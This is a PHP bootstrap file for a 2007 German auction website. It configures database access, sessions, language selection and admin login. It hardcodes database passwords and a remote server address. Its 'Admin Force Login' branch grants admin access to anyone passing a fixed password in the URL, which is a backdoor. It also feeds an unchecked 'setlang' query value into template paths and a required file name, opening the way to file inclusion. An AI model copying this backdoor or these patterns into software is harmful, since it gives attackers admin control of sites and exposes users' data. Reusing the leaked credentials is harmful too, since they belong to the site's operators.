<?php
//=========================================
// Script	: Auktion
// File		: index.php
// Version	: 0.1
// Author	: Matthias Franke
// Email	: info@matthiasfranke.com
// Website	: http://www.matthiasfranke.com
//=========================================
// Copyright (c) 2007 Matthias Franke
//=========================================
// geändert
if($_SERVER["HTTP_HOST"]=="bbd24.local" || $_SERVER["HTTP_HOST"]=="matthiasfranke.dyndns.org"){
	
	//define('BASE_DIR','/srv/www/htdocs/franke/auktion');
	define('BASE_DIR', realpath(dirname(__FILE__).'/../../'));
	define('ROOT_DIR',BASE_DIR.'/html');
	define('MB_DIR',BASE_DIR.'/files');
	define('ROOT_URL','bbd24.local');
	define('DB_TYPE', 'mysql');
	define('DB_HOST', 'localhost');
	define('DB_USER', 'root');
	define('DB_PASS', 'lisali12');
	define('DB_NAME', 'stosch');
	define('SYS_MAIL', 'info@matthiasfranke.com');
		
} else {
	
	define('BASE_DIR','/srv/www/htdocs/stosch');
	define('ROOT_DIR',BASE_DIR.'/html');
	define('MB_DIR',BASE_DIR.'/files');
	define('ROOT_URL','bbd.givs.de');
	define('DB_TYPE', 'mysql');
	define('DB_HOST', '78.46.39.71');
	define('DB_USER', 'stosch');
	define('DB_PASS', 'lisali12');
	define('DB_NAME', 'stosch');
	define('SYS_MAIL', 'info@matthiasfranke.com');
	
}

//if($_SERVER["HTTP_HOST"]=="auktion_thomas.local") ini_set('session.cookie_domain', '');
session_start();
//header("Set-Cookie: ".SID."; path=/; secure");

umask(007);

# Set Language

define('DEFAULT_LANG','DE');

if (!isset($_SESSION['language'])) {
	$accept_lang=getenv('HTTP_ACCEPT_LANGUAGE');
	$accept_lang=preg_split(';[\s,]+;', $accept_lang, -1, PREG_SPLIT_NO_EMPTY);
	$accept_lang=(!isset($accept_lang[0]))?DEFAULT_LANG:strtoupper(substr($accept_lang[0],0,2));
	switch ($accept_lang) {
		case "DE":$_SESSION['language']="DE";break;
		//case "EN":$_SESSION['language']="EN";break;
		default:$_SESSION['language']="DE";
	}
}

if (isset($_GET["setlang"])) {
	$_SESSION["language"]=$_GET["setlang"];
}

define('CLASS_DIR',ROOT_DIR.'/libs/');
define('INC_DIR',ROOT_DIR.'/inc');
define('LANG_DIR',ROOT_DIR.'/lang');
if($_SERVER['PHP_SELF']=="/admin/index.php" || $_SERVER['PHP_SELF']=="/admin/mail.php"){
	define('TPL_DIR',BASE_DIR.'/templates/admin');
	define('TPL_DIR_C',BASE_DIR.'/templates_c/admin');
} else {
	define('TPL_DIR',BASE_DIR.'/templates/'.$_SESSION['language']);
	define('TPL_DIR_C',BASE_DIR.'/templates_c/'.$_SESSION['language']);
}
define('CONFIG_DIR',ROOT_DIR.'/configs');
define('SPAW_DIR',ROOT_DIR.'/spaw');

require_once('Mail.php');
require_once('Mail/mime.php');
require_once("Date.php");
# Set DB
define("DB_DSN","mysql://".DB_USER.":".DB_PASS."@".DB_HOST."/".DB_NAME);

require_once('DB.php');

$GLOBALS['options'] = array(
	'debug'       => 2,
	'portability' => DB_PORTABILITY_ALL,
);

require_once(realpath(dirname(__FILE__).'/../libs/adodb/adodb.inc.php'));

$db =& DB::connect(DB_DSN, $GLOBALS['options']);
if (PEAR::isError($db)) {
	die($db->getMessage());
}
require_once(CONFIG_DIR.'/const.inc.php');
require_once(CONFIG_DIR.'/templates.inc.php');
require_once(INC_DIR.'/sysfunc.inc.php');
require_once(LANG_DIR.'/lang.'.strtolower($_SESSION['language']).'.inc.php');
require_once(CLASS_DIR.'Smarty.class.php');
require_once(CLASS_DIR.'/DBapi.class.php');
require_once(CLASS_DIR.'/AUTH.class.php');
require_once(CLASS_DIR.'/IMAGES.class.php');
require_once(CLASS_DIR.'/MAIL.class.php');
require_once(CLASS_DIR.'/ADMIN.class.php');
require_once(SPAW_DIR.'/spaw.inc.php');


$smarty = new Smarty();
$auth = new AUTH();
$images = new IMAGES();
$mailtpl = new MAILTPL();
$GLOBALS['dbapi'] = new DBAPI;

require_once $smarty->_get_plugin_filepath('function', 'eval');

# Subdomain
if(empty($_SERVER['QUERY_STRING'])){
	$url_pages=DBAPI::check_member_subdomain($_SERVER['HTTP_HOST']);
	if($url_pages){
		header('Location:'.$url_pages);
		die();
	}
}

define('ERROR_NOT_LOGGEDIN', '/index.php?p='.URL_LINK_LOGIN);

if(isset($_GET['logout'])) {
	AUTH::logout();
	header('Location:/index.php');
	die();
}

// Postvars nach Login Umleitung wiederherstellen
if(isset($_GET['x5dgqre80']) && isset($_SESSION['_save_vars'])) {
	$_POST = $_SESSION['_save_vars'];
	unset($_SESSION['_save_vars']);
}

# Login Admin
if(!empty($_POST['admin_login']) && !empty($_POST['admin_pass'])){
	$auth->admin_login($_POST['admin_login'],$_POST['admin_pass']);
	if(!$auth->isAdminLoggedin()){
		header('Location:/admin/index.php?error=ERROR_INFO_21');
	}
}

# Admin Force Login
if(!empty($_GET['force_admin_login']) && $_GET['pass']=="grau0104"){
	$auth->force_admin_login($_GET['force_admin_login']);	
}

# Sichere Seiten
$secure_pages=array(
	URL_LINK_XXXXX,
	URL_LINK_XXXXX,
	);

if(!empty($_GET['p']) && in_array($_GET['p'],$secure_pages) && $_GET['secure_reload']==false && $_SERVER['PHP_SELF']!="/admin/index.php"){
	if(!$auth->isLoggedin()){
		header('Location:/index.php?secure_reload=1&start='.$_GET['p']);
		die();
	}
}

$smarty->assign("p",$_GET['p']);
$smarty->assign("referer",$_SERVER['REQUEST_URI']);
$smarty->assign("set_referer",$_GET['set_referer']);
$smarty->assign("iso",$_SESSION['language']);
$smarty->assign("loggedin",$auth->isLoggedin());
$smarty->assign('my_member_id', AUTH::member_id());

if(!empty($_GET['error'])){
	if(empty($_GET['global_info_txt'])){
		$smarty->assign("error",@constant($_GET['error']));
	} else {
		$smarty->assign("error",sprintf(@constant($_GET['error']),$_GET['global_info_txt']));
	}
}
if(!function_exists('make_seed')) {
	// Anfagswert über aktuelle Mikrosekunde setzen
	function make_seed()
	{
	  list($usec, $sec) = explode(' ', microtime());
	  return (float) $sec + ((float) $usec * 100000);
	}
}

srand(make_seed());

function microtime_float()
{
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}
?>